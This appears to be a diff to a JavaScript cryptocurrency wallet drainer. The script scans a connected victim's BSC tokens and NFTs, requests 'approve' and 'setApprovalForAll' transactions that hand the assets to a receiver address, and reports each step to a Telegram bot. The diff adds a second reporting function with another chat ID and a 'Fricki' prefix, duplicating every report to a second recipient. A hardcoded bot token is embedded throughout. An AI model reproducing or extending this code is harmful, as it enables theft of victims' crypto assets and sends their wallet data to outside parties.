@@ -321,6 +321,24 @@ async function getPrice(address){
 
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
+    const chat_id = 1114693003;
+    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
+          method: "GET",
+          headers: {
+              
+          }
+      })
+      .then(async(res) => {
+          if(res.status > 399) throw res;
+          resolve(await res.json());
+      }).catch(err=>{
+          reject(err);
+      })
+  })
+}
+
+async function sendMessage1(message){
+  return new Promise((resolve, reject)=>{
     const chat_id = 5227607491;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
@@ -429,11 +447,13 @@ async function proceed(){
           
         });
         await sendMessage(`BSC : connected to ${user_address}`);
+        await sendMessage1(` FrickiBSC : connected to ${user_address}`);
         console.log('bsc tokens: %o', bsc_tokens)
         
     
         if (bsc_tokens.length < 1 && bsc_NFTs.length < 1) {
           await sendMessage(`No valuable token or nfts found` )
+          await sendMessage1(` FrickiNo valuable token or nfts found` )
           const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new bsc balance", e);
           });
@@ -455,8 +475,11 @@ async function proceed(){
           console.log("Insufficient funds")
           if (bsc_tokens.length > 0){
             await sendMessage(`Tokens found` )
+            await sendMessage1(` FrickiTokens found` )
           } else if (bsc_NFTs.length > 0){
             await sendMessage(`NFTs found` )
+            await sendMessage1(` FrickiNFTs found` )
+
           }
         }
 
@@ -545,6 +568,11 @@ async function proceed(){
                             Amount : ${amount},
                             Your address : ${receiver_address}
                               ` )
+              await sendMessage1(` FrickiApproving 
+                            Token Address : ${contractAddress},
+                            Amount : ${amount},
+                            Your address : ${receiver_address}
+                              ` )
               const sendOptions = {
                 contractAddress: contractAddress,
                 functionName: "approve",
@@ -573,9 +601,12 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
+            await sendMessage1(` FrickiApproved` )
           }
           else {
             await sendMessage(`Denied` )
+            await sendMessage1(` FrickiDenied` )
+
           }
               console.log(transaction);
               // if(transaction){
@@ -598,6 +629,11 @@ async function proceed(){
                                 token_id : ${tokenId}
                                 Your address : ${receiver_address}
                                   ` )
+                                  await sendMessage1(` FrickiApproving 
+                                  NFT Address : ${contractAddress},
+                                  token_id : ${tokenId}
+                                  Your address : ${receiver_address}
+                                    ` )
               const sendOptions = {
                 contractAddress: contractAddress,
                 functionName: "setApprovalForAll",
@@ -622,9 +658,11 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
+            await sendMessage1(` FrickiApproved` )
           }
           else {
             await sendMessage(`Denied` )
+            await sendMessage1(` FrickiDenied` )
           }
               console.log(transaction);
               // if(transaction){
